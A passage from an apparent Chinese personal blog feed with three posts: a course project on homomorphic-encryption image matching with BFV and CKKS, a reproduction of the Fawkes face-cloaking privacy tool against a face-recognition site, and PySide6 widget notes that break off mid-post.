title="显示直观且详细"></a>显示直观且详细</h4><p>我们通过精确测量加密、匹配以及解密过程中<strong>每一步骤所消耗的时间</strong>，为用户提供了一个明确的性能指标。例如，记录加密单张图片所需的时间，可以<strong>帮助用户理解不同参数设置对加密速度的影响</strong>。为了提高用户体验，在处理大量数据时，我们实现了一个<strong>进度条</strong>来直观地展示当前操作的进度。在图像匹配过程中，除了展示匹配结果，我们还提供了<strong>匹配图像的详细标签信息</strong>。这一点在测试算法效率时尤为重要，因为它不仅显示了哪些图像被匹配到，还<strong>提供了关于匹配质量的额外信息</strong>。</p><p>具体实现如下：</p><ol><li><p><strong>时间展示</strong>：</p><p>在每个步骤开始前记录当前时间，步骤结束后再次记录时间，通过两者的差值计算步骤耗时</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="comment"># 加密或其他处理过程</span></span><br><span class="line">end_time = time.time()</span><br><span class="line"></span><br><span class="line">elapsed_time = end_time - start_time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;该步骤耗时: <span class="subst">&#123;elapsed_time&#125;</span>秒&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>进度条显示</strong>：</p><p>对于处理大量数据的情况，通过进度条来展示完成进度很有必要，我们<strong>没有使用现成的tqdm库，而是手搓了一段进度条代码</strong>，主要是为了方便控制进度条增长的条件（当数据很多时，可以设置每隔1%进度条增长一次）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新进度条</span></span><br><span class="line">percent_done = (i + <span class="number">1</span>) / total_files</span><br><span class="line">bar_length = <span class="number">50</span></span><br><span class="line">block = <span class="built_in">int</span>(bar_length * percent_done )</span><br><span class="line">text = <span class="string">&quot;\r[&#123;&#125;&#123;&#125;] &#123;:.2f&#125;%&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;█&quot;</span> * block, <span class="string">&quot; &quot;</span> * (bar_length - block), percent_done*<span class="number">100</span>)</span><br><span class="line">sys.stdout.write(text)</span><br><span class="line">sys.stdout.flush()</span><br></pre></td></tr></table></figure></li><li><p><strong>标签信息</strong>：</p><p>在图像匹配过程中，除了显示匹配结果外，还可以显示匹配图像的详细标签信息，这有助于用户更全面地评估匹配算法的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从数据库中提取标签信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_image_tags</span>(<span class="params">image_id</span>):</span><br><span class="line">    <span class="comment"># 数据库查询逻辑</span></span><br><span class="line">    <span class="keyword">return</span> identity_tag, feature_tags</span><br><span class="line"></span><br><span class="line">identity_tag, feature_tags = get_image_tags(db_name, best_match[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Identity Tag: <span class="subst">&#123;identity_tag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Feature Tags: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(feature_tags)&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="实验及分析"><a href="#实验及分析" class="headerlink" title="实验及分析"></a>实验及分析</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>下面是进行实验时，本机的配置</p><ul><li>CPU: AMD Ryzen 7 5800H</li><li>GPU: NVIDIA RTX 3070 Laptop 8G</li><li>Memory: 16GB</li><li>Operating System: Windows10</li><li>Python Version: 3.8.18</li></ul><p>我们依次对已有图像数据进行加密、存入数据库、查询匹配的操作，并比对不同算法的效率</p><p>首先测试BFV的时间</p><h4 id="BFV"><a href="#BFV" class="headerlink" title="BFV"></a>BFV</h4><p>BFV的加密参数如下所示，我们需要保证加密容量能够允许加密64*64*3大小的图像向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poly_modulus_degree = <span class="number">32768</span></span><br><span class="line">plain_modulus = <span class="number">65537</span></span><br><span class="line">coeff_mod_bit_sizes=[<span class="number">60</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">60</span>]</span><br></pre></td></tr></table></figure><p>首先我们模拟服务端对数据的初始化操作，即加密图像数据并存入数据库</p><p>执行如下指令，对图像进行BFV全同态加密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tenseal_encrypt.py -a BFV -i data/storage_imgs -o data/enc_storage_imgs</span><br></pre></td></tr></table></figure><p>这里使用的是默认参数，当然也可以直接指定参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tenseal_encrypt.py -a BFV -i data/storage_imgs -o data/enc_storage_imgs -p 32768 -m 65537</span><br></pre></td></tr></table></figure><img src="/posts/3c0eb5a1ba70/image-20231210222324400.png" class="" title="image-20231210222324400"><p>统计得到<strong>单张图像的加密时间为0.019秒</strong></p><p>在<code>keys</code>目录下我们可以查看到上下文初始化得到的公钥和私钥</p><img src="/posts/3c0eb5a1ba70/image-20231210223816001.png" class="" title="image-20231210223816001"><p>在我们选择的输出目录<code>data/enc_storage_imgs</code>下可以查看加密后的数据</p><img src="/posts/3c0eb5a1ba70/image-20231210222516240-17022183170171.png" class="" title="image-20231210222516240"><p>单张图片的加密数据大小为2MB，约<strong>为原图像大小的1000倍</strong></p><img src="/posts/3c0eb5a1ba70/image-20231210222559511.png" class="" title="image-20231210222559511"><p>运行<code>DBUploader.py</code>程序，将加密数据存入SQLite数据库，这里在项目根目录下生成数据库文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\DBuploader.py -i .\data\enc_storage_imgs\</span><br></pre></td></tr></table></figure><img src="/posts/3c0eb5a1ba70/image-20231210223335373.png" class="" title="image-20231210223335373"><p>可以观察到成功生成了数据库文件<code>encrypted_images.db</code></p><img src="/posts/3c0eb5a1ba70/image-20231210223416616.png" class="" title="image-20231210223416616"><p>接下来我们模拟用户端的操作</p><p>将<code>data/matching_imgs</code>文件夹下的待匹配图像加密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tenseal_encrypt.py -a BFV -i data/matching_imgs -o data/enc_matching_imgs -c .\keys\public_context</span><br></pre></td></tr></table></figure><p>这里使用的是前面指令在<code>keys</code>目录下生成的公钥</p><img src="/posts/3c0eb5a1ba70/image-20231210224301515.png" class="" title="image-20231210224301515"><p>加密待匹配图像时单张图像的加密时间为0.021秒</p><p>最后是查询操作</p><p>执行如下指令，我们将查询结果保存在<code>data/result</code>目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\tenseal_matching.py -a BFV -i data/enc_matching_imgs -o data/result -c keys/private_context -db .\encrypted_images.db</span><br></pre></td></tr></table></figure><img src="/posts/3c0eb5a1ba70/image-20231211005417766.png" class="" title="image-20231211005417766"><p>单张图片的<strong>匹配操作（即密态计算）时间为0.02秒，解密时间为0.007秒左右</strong></p><p>我们的待匹配图像中有两张数据库中已有图像，以及三张数据库中未出现过的图像</p><p>数据库中存在的图片都成功匹配到相同图片</p><img src="/posts/3c0eb5a1ba70/image-20231211005551939.png" class="" title="image-20231211005551939"><p>而不存在的图片则匹配到一个相似度较高的图</p><img src="/posts/3c0eb5a1ba70/image-20231211005609661.png" class="" title="image-20231211005609661"><p>我们可以打开<code>data/matching_imgs</code>和<code>data/result</code>文件夹来对比结果的效果</p><img src="/posts/3c0eb5a1ba70/image-20231211001850485.png" class="" title="image-20231211001850485"><img src="/posts/3c0eb5a1ba70/image-20231211001900621.png" class="" title="image-20231211001900621"><p>匹配到的图像与原图在人脸的位置以及发型上都较为相似，<strong>符合欧氏距离应有的匹配效果</strong></p><h4 id="CKKS"><a href="#CKKS" class="headerlink" title="CKKS"></a>CKKS</h4><p>BFV的加密参数如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global_scale = <span class="number">2</span>**<span class="number">40</span></span><br></pre></td></tr></table></figure><p>依次运行以下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python tenseal_encrypt.py -a CKKS -i data/storage_imgs -o data/enc_storage_imgs</span><br><span class="line">python .\DBuploader.py -i .\data\enc_storage_imgs\</span><br><span class="line">python tenseal_encrypt.py -a CKKS -i data/matching_imgs -o data/enc_matching_imgs -c .\keys\public_context</span><br><span class="line">python .\tenseal_matching.py -a CKKS -i data/enc_matching_imgs -o data/result -c keys/private_context -db .\encrypted_images.db</span><br></pre></td></tr></table></figure><p>统计得到<strong>单张图像的加密时间为0.024秒左右</strong></p><img src="/posts/3c0eb5a1ba70/image-20231211013257836.png" class="" title="image-20231211013257836"><p>存储大小同样是2MB左右</p><img src="/posts/3c0eb5a1ba70/image-20231211013436177.png" class="" title="image-20231211013436177"><p>测试查询匹配</p><img src="/posts/3c0eb5a1ba70/image-20231211015531385.png" class="" title="image-20231211015531385"><p>单张图片的<strong>匹配操作（即密态计算）时间为0.02秒，解密时间为0.008秒左右</strong></p><img src="/posts/3c0eb5a1ba70/image-20231211111653823.png" class="" title="image-20231211111653823"><p>最后的识别结果和BFV一致</p><h4 id="对比不同参数"><a href="#对比不同参数" class="headerlink" title="对比不同参数"></a>对比不同参数</h4><p>将收集的数据列为更为直观的表格</p><div class="table-container"><table><thead><tr><th>算法</th><th>单张图像加密时间</th><th>单张加密图像大小</th><th>单张图像匹配时间</th><th>单张图像解密时间</th></tr></thead><tbody><tr><td>BFV</td><td>0.019s</td><td>2MB</td><td>0.02s</td><td>0.007s</td></tr><tr><td>CKKS</td><td>0.024s</td><td>2MB</td><td>0.019s</td><td>0.008s</td></tr></tbody></table></div><p>当参数设置相近时，BFV和CKKS算法在图像数据加密结果方面的效果相似，表明这两种算法在处理此类数据时具有一定的等效性。</p><p>而<strong>在加密花费的时间上，BFV相对于CKKS速度更快</strong></p><p>造成这种现象的原因，可能是CKKS是运用在浮点级数据上的算法，对整数运算的支持程度并没有BFV高</p><p>我们将BFV的<code>plain_modulus</code>参数调大一些，设为786433</p><p>而CKKS的<code>global_scale</code>参数设为2**60</p><img src="/posts/3c0eb5a1ba70/image-20231211143026527.png" class="" title="image-20231211143026527"><p>可以得到下表测试数据</p><div class="table-container"><table><thead><tr><th>算法</th><th>plain_modulus</th><th>global_scale</th><th>单张图像加密时间</th></tr></thead><tbody><tr><td>BFV</td><td>65537</td><td></td><td>0.019s</td></tr><tr><td>BFV</td><td>786433</td><td></td><td>0.021s</td></tr><tr><td>CKKS</td><td></td><td>2**40</td><td>0.024s</td></tr><tr><td>CKKS</td><td></td><td>2**60</td><td>0.024s</td></tr></tbody></table></div><p>可以发现，当密文空间增大、加密安全性增加时，BFV的加密时间增长幅度更大</p><p>总的来说，BFV更适合需要精确整数计算的场景，而CKKS更适合于可以接受一定近似的浮点数计算。在加密的效率上，当数据量较大时，BFV比CKKS的效率更高，且CKKS对密文空间大小的敏感程度更高</p>]]></content>
      
      
      
        <tags>
            
            <tag> project </tag>
            
            <tag> 数据安全与隐私计算 </tag>
            
            <tag> homework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合成数据模型fawkes复现</title>
      <link href="/posts/87e0deaffed3/"/>
      <url>/posts/87e0deaffed3/</url>
      
        <content type="html"><![CDATA[<h2 id="构造环境"><a href="#构造环境" class="headerlink" title="构造环境"></a>构造环境</h2><p>创建一个新的conda环境fawkes</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n fawkes python=3.7</span><br><span class="line">conda activate fawkes</span><br></pre></td></tr></table></figure><img src="/posts/87e0deaffed3/image-20231124235146880.webp" class="" title="image-20231124235146880"><p>安装fawkes库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fawkes</span><br></pre></td></tr></table></figure><img src="/posts/87e0deaffed3/image-20231125134708607.webp" class="" title="image-20231125134708607"><h2 id="构建测试样本"><a href="#构建测试样本" class="headerlink" title="构建测试样本"></a>构建测试样本</h2><p>我们寻找一些名人图片用于测试该数据合成模型的效果，因为很多名人已经在网络上泄漏了大量的人脸信息，这些信息已经被识别模型建档</p><p>换句话说，这些测试样本需要满足<strong>能够被主流的人脸识别程序识别出身份</strong></p><p>预期在经过fawkes模型的干扰之后，测试样本无法被识别</p><img src="/posts/87e0deaffed3/image-20231125223842369.webp" class="" title="image-20231125223842369"><p>需要注意的是，人脸图像<strong>不能直接来源于搜索引擎的结果，因为这些图像很可能被用作训练数据集</strong>，我们可以<strong>在目标人物的演讲视频中截图</strong>，<strong>这样这张图片就从来没有在网络上出现过</strong></p><img src="/posts/87e0deaffed3/test1.jpg" class="" title="test1"><p>我选取了三位外国领导人的人脸图像作为测试样本，放在<code>test_imgs</code>文件夹下</p><img src="/posts/87e0deaffed3/image-20231126020403726.webp" class="" title="image-20231126020403726"><h2 id="识别测试样本"><a href="#识别测试样本" class="headerlink" title="识别测试样本"></a>识别测试样本</h2><p>首先我们需要证明这些测试样本能够被主流人脸识别网站识别身份</p><p>这里我选择了一个具有高性能模型的人脸匹配网站</p><p><strong>pictriev</strong>：<a href="http://www.pictriev.com/?lang=zh#">http://www.pictriev.com/?lang=zh#</a></p><img src="/posts/87e0deaffed3/image-20231126020600453.webp" class="" title="image-20231126020600453"><img src="/posts/87e0deaffed3/image-20231126020654758.webp" class="" title="image-20231126020654758"><img src="/posts/87e0deaffed3/image-20231126020728223.webp" class="" title="image-20231126020728223"><p>可以看到，三种图片都被成功识别</p><p>安倍晋三和特朗普的识别准确率更是有惊人的90%以上</p><h2 id="生成合成数据"><a href="#生成合成数据" class="headerlink" title="生成合成数据"></a>生成合成数据</h2><p>接下来我们运行fawkes模型，生成三张测试样本的合成数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fawkes -d ./test_imgs --mode low</span><br></pre></td></tr></table></figure><img src="/posts/87e0deaffed3/image-20231125214729748.webp" class="" title="image-20231125214729748"><p>由于是第一次运行模型，需要下载模型数据</p><img src="/posts/87e0deaffed3/image-20231125215343607.webp" class="" title="image-20231125215343607"><p>当模式选为low时，<strong>每张图片生成的时间在20秒钟左右</strong></p><img src="/posts/87e0deaffed3/image-20231125215434005.webp" class="" title="image-20231125215434005"><p>合成数据与原测试样本生成在了同一目录下</p><img src="/posts/87e0deaffed3/image-20231126021112274.webp" class="" title="image-20231126021112274"><p>我们将生成的合成数据移到另一个文件夹<code>synthesis_imgs</code>，然后再分别生成mid和high的合成数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fawkes -d ./test_imgs --mode mid</span><br><span class="line">fawkes -d ./test_imgs --mode high</span><br></pre></td></tr></table></figure><p>中度干扰模式中，一张合成数据图需要140秒来生成。而到高干扰模式时，一张合成数据图则需要300秒来生成</p><img src="/posts/87e0deaffed3/image-20231126125956936.webp" class="" title="image-20231126125956936"><p>最终得到三个测试样本在高中低模式下的合成数据</p><img src="/posts/87e0deaffed3/image-20231126130137151.webp" class="" title="image-20231126130137151"><h2 id="对比与分析"><a href="#对比与分析" class="headerlink" title="对比与分析"></a>对比与分析</h2><p>首先，我们从对同一张图片在不同模式下的扰动上着手分析</p><p>写一个python脚本，将同一张测试样本的原图和合成数据放在一起展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">test_img_folder = <span class="string">&quot;test_imgs&quot;</span></span><br><span class="line">synthesis_img_folder = <span class="string">&quot;synthesis_imgs&quot;</span></span><br><span class="line">file_names = [<span class="string">&quot;test1&quot;</span>, <span class="string">&quot;test2&quot;</span>, <span class="string">&quot;test3&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line"></span><br><span class="line">    original_image_path = os.path.join(test_img_folder, <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>.jpg&quot;</span>)</span><br><span class="line">    original_image = Image.<span class="built_in">open</span>(original_image_path)</span><br><span class="line">    low_image = Image.<span class="built_in">open</span>(os.path.join(synthesis_img_folder, <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>_low.png&quot;</span>))</span><br><span class="line">    mid_image = Image.<span class="built_in">open</span>(os.path.join(synthesis_img_folder, <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>_mid.png&quot;</span>))</span><br><span class="line">    high_image = Image.<span class="built_in">open</span>(os.path.join(synthesis_img_folder, <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>_high.png&quot;</span>))</span><br><span class="line"></span><br><span class="line">    fontsize = <span class="number">60</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, fontsize)</span><br><span class="line">    image_width = <span class="built_in">max</span>(original_image.width, low_image.width, mid_image.width, high_image.width)</span><br><span class="line">    image_height = <span class="built_in">max</span>(original_image.height, low_image.height, mid_image.height, high_image.height)</span><br><span class="line"></span><br><span class="line">    total_width = image_width * <span class="number">2</span></span><br><span class="line">    total_height = (image_height + fontsize + <span class="number">20</span>) * <span class="number">2</span></span><br><span class="line">    new_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (total_width, total_height), <span class="string">&#x27;white&#x27;</span>)  <span class="comment"># 使用白色背景</span></span><br><span class="line">    <span class="comment"># 将图像按顺序拼接在一起</span></span><br><span class="line">    images = [original_image, low_image, mid_image, high_image]</span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(images):</span><br><span class="line">        x_offset = (i % <span class="number">2</span>) * image_width</span><br><span class="line">        y_offset = (i // <span class="number">2</span>) * (image_height + fontsize + <span class="number">20</span>)</span><br><span class="line">        new_image.paste(img.resize((image_width, image_height)), (x_offset, y_offset))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加文本标注</span></span><br><span class="line">    draw = ImageDraw.Draw(new_image)</span><br><span class="line">    labels = [<span class="string">&quot;Original&quot;</span>, <span class="string">&quot;Low&quot;</span>, <span class="string">&quot;Mid&quot;</span>, <span class="string">&quot;High&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i, label <span class="keyword">in</span> <span class="built_in">enumerate</span>(labels):</span><br><span class="line">        x_offset = (i % <span class="number">2</span>) * image_width + image_width // <span class="number">2</span> - fontsize</span><br><span class="line">        y_offset = (i // <span class="number">2</span>) * (image_height + fontsize + <span class="number">20</span>) + image_height</span><br><span class="line">        draw.text((x_offset, y_offset), label, fill=<span class="string">&quot;black&quot;</span>, font=font)</span><br><span class="line"></span><br><span class="line">    new_image.save(os.path.join(synthesis_img_folder, <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>_comparison.png&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;拼接完成&quot;</span>)</span><br></pre></td></tr></table></figure><p>下面是每个样本的对比图</p><img src="/posts/87e0deaffed3/test1_comparison.webp" class="" title="test1_comparison"><img src="/posts/87e0deaffed3/test2_comparison.webp" class="" title="test2_comparison"><img src="/posts/87e0deaffed3/test3_comparison.webp" class="" title="test3_comparison"><p>可以看到，l<strong>ow级别的扰动肉眼基本无法分辨出来</strong></p><p>但是<strong>high级别的扰动就非常明显</strong>了，许多人脸特征与原图有了很大区别</p><p>接下来我们测试合成样本的识别结果如何</p><p>编写类似的python脚本，将结果放在一账通中对比</p><img src="/posts/87e0deaffed3/image-20231126134159428.webp" class="" title="image-20231126134159428"><p>首先是样本test1</p><img src="/posts/87e0deaffed3/test1_result_comparison.webp" class="" title="test1_result_comparison"><p>可以看到，low和high模式下，奥巴马被成功识别为错误身份</p><p>接下来分析test2</p><img src="/posts/87e0deaffed3/test2_result_comparison.webp" class="" title="test2_result_comparison"><p>这张测试样本的合成数据效果不太明显，即使是高级别的扰动也只让预测值从94%下降到77%</p><p>经过分析，我认为原因<strong>可能是原图的人脸部分不够清晰</strong>，导致合成数据时生成的扰动没有太大效果</p><p>最后一张test3</p><img src="/posts/87e0deaffed3/test3_result_comparison-17009777519252.webp" class="" title="test3_result_comparison"><p>可以看到在low和mid模式下，对特朗普的预测值都有不同程度的下降</p><p>总的来说，fawkes的对人脸特征的攻击还是有部分效果</p><p>但是要达到较高扰动下预测值降低，必须保证原图的人脸足够清晰</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> 复现 </tag>
            
            <tag> 隐私保护 </tag>
            
            <tag> 合成数据 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 pyside6学习笔记及实践（二）</title>
      <link href="/posts/d765094b05e7/"/>
      <url>/posts/d765094b05e7/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章为b站PySide6教程以及官方文档的学习笔记</p><p>原视频传送门如下</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1c84y1N7iL" title="【已完结】PySide6百炼成真，带你系统性入门Qt" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/a0589121b678174899c451c1a47538260e1b6e70.jpg@320w_200h_1c_!web-space-favlist-video.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【已完结】PySide6百炼成真，带你系统性入门Qt" />              </div>              <div class="flink-item-name">【已完结】PySide6百炼成真，带你系统性入门Qt</div>               <div class="flink-item-desc" title="祝大家百炼成真，早日做出自己心仪的界面">祝大家百炼成真，早日做出自己心仪的界面</div>            </a>          </div></div></div><p>官方文档链接：<a href="https://doc.qt.io/qtforpython-6/">Qt for Python</a></p><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="下拉框-QComboBox"><a href="#下拉框-QComboBox" class="headerlink" title="下拉框(QComboBox)"></a>下拉框(QComboBox)</h3><p>下拉框在QtDesigner中的控件名为<strong>Combo Box</strong></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QComboBox</span><br><span class="line">cb = QComboBox()</span><br></pre></td></tr></table></figure><p>当然一个下拉框只有框架是无法发挥作用的</p><p>我们可以通过<code>.addItems</code>的方法通过列表参数向下拉框中添加元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cb.addItems([<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>])</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/d765094b05e7/image-20231115145726028.png" class="" title="image-20231115145726028"><p>当然我们还需要将对下拉框的一些操作作为信号，并为其绑定槽</p><p>例如<code>currentIndexChanged</code>可以在下拉框选定项目改变时发出信号</p><p>而<code>highlighted</code> 会于用户在下拉列表中高亮（但未选择）一个项目时发射信号。</p><p>当然这些信号也会有返回值传递给槽</p><p>例如我们如果想写一个程序在控制台打印当前选中的项目时，有以下两种方法实现</p><ol><li><p>使用控件的<code>currentText</code>属性获取当前选中项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cb.currentIndexChanged.connect(<span class="keyword">lambda</span>:<span class="built_in">print</span>(cb.currentText()))</span><br></pre></td></tr></table></figure></li><li><p>利用信号的返回的当前选中项目传递给槽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cb.currentTextChanged.connect(self.<span class="built_in">print</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">self,choose</span>):</span><br><span class="line">    <span class="built_in">print</span>(choose)</span><br></pre></td></tr></table></figure></li></ol><h3 id="复选框-QCheckBox"><a href="#复选框-QCheckBox" class="headerlink" title="复选框(QCheckBox)"></a>复选框(QCheckBox)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QCheckBox</span><br><span class="line">cb = QCheckBox(<span class="string">&quot;我是复选框&quot;</span>)</span><br></pre></td></tr></table></figure><p>复选框控件有且只有一种信号<code>stateChanged</code>，用于传递复选框选中状态改变的信号</p><p>并且该信号会返回一个int类型的参数，选中时返回2，未选择返回0</p><p>当然我们也可以通过该控件的<code>isChecked</code>方法来获取当前状态，选中时返回True，未选中返回False</p><h3 id="单选框-QRadioButton"><a href="#单选框-QRadioButton" class="headerlink" title="单选框(QRadioButton)"></a>单选框(QRadioButton)</h3><p>单选框一般需要搭配<strong>Group Box</strong>来一起使用</p><p>当我们将几个单选框加到同一个group后，同组的单选框每次就只能勾选其中的某一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self.group1 = QButtonGroup(self)</span><br><span class="line">label1 = QLabel(<span class="string">&quot;请选择你的CTF方向&quot;</span>)</span><br><span class="line">btn1 = QRadioButton(<span class="string">&quot;Web&quot;</span>)</span><br><span class="line">btn2 = QRadioButton(<span class="string">&quot;Crypto&quot;</span>)</span><br><span class="line">btn3 = QRadioButton(<span class="string">&quot;Pwn&quot;</span>)</span><br><span class="line">btn4 = QRadioButton(<span class="string">&quot;Misc&quot;</span>)</span><br><span class="line">btn5 = QRadioButton(<span class="string">&quot;Reverse&quot;</span>)</span><br><span class="line">self.group1.addButton(btn1)</span><br><span class="line">self.group1.addButton(btn2)</span><br><span class="line">self.group1.addButton(btn3)</span><br><span class="line">self.group1.addButton(btn4)</span><br><span class="line">self.group1.addButton(btn5)</span><br></pre></td></tr></table></figure><p>如果我们想获得此时被选中的单选框，可以通过QButtonGroup的<code>checkedButton</code>来获得</p><h3 id="文本框-QTextEdit和QPlainTextEdit"><a href="#文本框-QTextEdit和QPlainTextEdit" class="headerlink" title="文本框(QTextEdit和QPlainTextEdit)"></a>文本框(QTextEdit和QPlainTextEdit)</h3><p>当我们想要输出大段的文本信息时，考虑使用文本框</p><p>在PySide6中，分为富文本框和纯文本框</p><p>在<strong>富文本框</strong>中，我们能<strong>输出一些特殊格式，例如Markdown、HTML</strong>等等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text1 = QTextEdit()</span><br><span class="line">text2 = QTextEdit()</span><br><span class="line">text1.setHtml(<span class="string">&quot;&lt;h1&gt;我是一级标题&lt;/h1&gt;&lt;h2&gt;我是二级标题&lt;/h2&gt;&quot;</span>)</span><br><span class="line">text2.setMarkdown(<span class="string">&quot;### 我是三级标题\n\n**我是加粗的文字**\n\n*我是斜体文字*&quot;</span>)</span><br></pre></td></tr></table></figure><p>效果如下：</p><img 